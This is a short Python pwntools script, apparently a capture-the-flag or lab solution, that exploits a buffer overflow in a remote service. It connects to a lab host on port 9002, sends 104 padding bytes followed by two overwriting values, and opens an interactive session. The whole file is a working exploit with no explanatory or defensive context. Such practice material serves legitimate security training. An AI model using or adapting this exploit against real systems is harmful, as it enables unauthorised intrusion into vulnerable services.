from pwn import *

p = remote('10.10.95.129',9002) # process('./a.out')

payload = 'A'*104
payload += '\xd3\xc0\x00\x00' + '\x33\xff\xc0\x00'

print(p.recvline())
p.sendline(payload)
p.interactive()
